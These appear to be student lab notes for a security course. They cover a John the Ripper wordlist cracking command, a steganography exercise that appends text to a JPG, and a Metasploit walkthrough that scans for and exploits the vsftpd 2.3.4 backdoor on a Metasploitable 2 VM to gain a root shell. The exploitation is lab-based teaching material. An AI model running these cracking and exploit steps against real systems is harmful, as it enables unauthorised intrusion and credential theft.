# john --wordlist=/usr/share/wordlists/rockyou.txt password.txt



Cryptii - Encryption and Decryption website


Steganography:
Step 1: Prep an image with hidden text (do this first so you have something to find)

Open Command Prompt (Win+R → type cmd → Enter), then:

cd Desktop

Create a small text file with your "secret" message:

echo SECRET MESSAGE: exam2026 > hidden.txt

Now append it to any image you have on your Desktop (replace anyimage.jpg with a real image filename you have there):

copy /b anyimage.jpg + hidden.txt secret.jpg

This creates secret.jpg — a valid image with your text appended to the end of its raw bytes.

If you don't have any image on Desktop, grab one quickly:

copy C:\Windows\Web\Wallpaper\Windows\img0.jpg Desktop\anyimage.jpg
cd Desktop

Then run the copy /b command above.

Step 2: Now follow the manual's exact procedure

Step 1: Open Command Prompt (already open)

Step 2: Navigate to the directory containing the image

cd Desktop

Step 3: Verify the image file

dir

You should see secret.jpg listed.

Step 4: Open the image using Notepad

notepad secret.jpg

Step 5: Scroll to the end of the file
Notepad will open showing mostly unreadable binary characters/symbols — that's normal, it's the raw image data. Use Ctrl+End to jump straight to the bottom.

Step 6: Observe any hidden text appended to the image
At the very end, you should see your readable message: SECRET MESSAGE: exam2026

Expected output (per manual): hidden text, if present, is displayed at the end of the file.


B.3 StegOnline


Prac - 4 : 
Setup

Step 1: Boot Metasploitable 2
Start your Metasploitable 2 VM (separate from Kali — same virtual network/NAT so they can reach each other).

Step 2: Find its IP address
From your Kali terminal:

bash
sudo netdiscover -r 192.168.1.0/24

(Adjust the subnet to match your VM network — check Kali's own IP first with ip a if you're not sure of the range.)

Or use nmap to sweep:

bash
nmap -sn 192.168.1.0/24

Look for a device that isn't your Kali box or your host machine — that's likely Metasploitable 2.

Step 3: Confirm vsFTPd is running and check its version

bash
nmap -sV -p 21 <METASPLOITABLE_IP>

You're looking for vsftpd 2.3.4 in the output — that specific version has a known backdoor vulnerability.

Practice — Run the Exploit

Step 4: Launch Metasploit

bash
msfconsole

Step 5: Find and select the exploit

search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor

Step 6: Set the target

set RHOSTS <METASPLOITABLE_IP>

Step 7: Verify your settings

show options

Step 8: Run it

run

If successful, you'll drop into a shell — confirm you have root access on the target:

whoami
id
uname -a

That's the full exploit chain. Go ahead and start with Step 1–2 (boot the VM, find its IP) and tell me what nmap -sV -p 21 <IP> shows once you've got the address.
